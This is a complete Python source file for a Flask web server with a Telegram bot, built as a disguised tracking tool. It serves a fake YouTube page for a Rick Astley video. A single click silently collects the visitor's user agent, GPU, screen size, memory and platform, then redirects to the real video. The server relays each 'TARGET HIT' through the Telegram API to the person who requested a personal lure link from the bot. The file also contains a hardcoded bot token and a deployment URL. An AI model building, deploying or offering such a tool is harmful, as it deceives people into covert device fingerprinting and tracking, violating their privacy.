import threading
import requests
import json
import os
import base64
import time
import sqlite3
from flask import Flask, render_template_string, request

# =================================================================
# [1] CONFIGURATION
# =================================================================
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('CREATE TABLE IF NOT EXISTS links (sid TEXT PRIMARY KEY, owner_id INTEGER)')
    conn.commit()
    conn.close()

def save_link(sid, owner_id):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (sid, owner_id))
    conn.commit()
    conn.close()

def get_owner(sid):
    conn = sqlite3.connect('phantom.db', check_same_thread=False)
    res = conn.execute('SELECT owner_id FROM links WHERE sid = ?', (sid,)).fetchone()
    conn.close()
    return res[0] if res else OVERLORD_ID

# =================================================================
# [2] LIGHTWEIGHT EXPLOIT PAGE
# =================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
    <meta property="og:description" content="YouTube Music Video" />
    <title>YouTube</title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
        #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; }
        .play::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
    </style>
</head>
<body onclick="ignite()">
    <div id="app"><div class="play"></div></div>
<script>
    const sid = "{{sid}}";
    let fired = false;

    function ignite() {
        if (fired) return;
        fired = true;

        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        const payload = {
            sid: sid,
            ua: navigator.userAgent,
            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
            res: screen.width + "x" + screen.height,
            mem: navigator.deviceMemory || "N/A",
            plat: navigator.platform
        };

        navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(payload)));

        setTimeout(() => {
            window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
        }, 350);
    }
</script>
</body>
</html>
"""

# =================================================================
# [3] SERVER LOGIC
# =================================================================

@app.route('/v/<sid>')
def serve(sid):
    return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/gate/capture', methods=['POST'])
def capture():
    try:
        data = json.loads(base64.b64decode(request.get_data()).decode())
        sid = str(data.get('sid'))
        
        report = (
            f"<b>✅ TARGET HIT</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🆔 ID: <code>{sid}</code>\n"
            f"🎮 GPU: <code>{data.get('gpu')}</code>\n"
            f"🧠 HW: <code>{data.get('mem')}GB / {data.get('plat')}</code>\n"
            f"📱 Res: <code>{data.get('res')}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🌐 UA: <code>{data.get('ua')[:100]}...</code>"
        )
        
        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                      json={"chat_id": get_owner(sid), "text": report, "parse_mode": "HTML"})
    except: pass
    return "OK"

@app.route('/ping')
@app.route('/system/heartbeat')
def health(): return "OK", 200

# =================================================================
# [4] C2 BOT ENGINE
# =================================================================

def bot_loop():
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{API_TOKEN}/getUpdates?offset={offset}&timeout=10").json()
            for upd in r.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message")
                if msg and "text" in msg:
                    cid = msg["chat"]["id"]
                    if msg["text"] == "/start":
                        save_link(str(cid), cid)
                        link = f"{BASE_URL}/v/{cid}"
                        requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                                      json={"chat_id": cid, "text": f"🔗 <b>Link:</b>\n<a href='{link}'>{link}</a>", "parse_mode": "HTML"})
        except: time.sleep(5)

if __name__ == '__main__':
    init_db()
    threading.Thread(target=bot_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT)
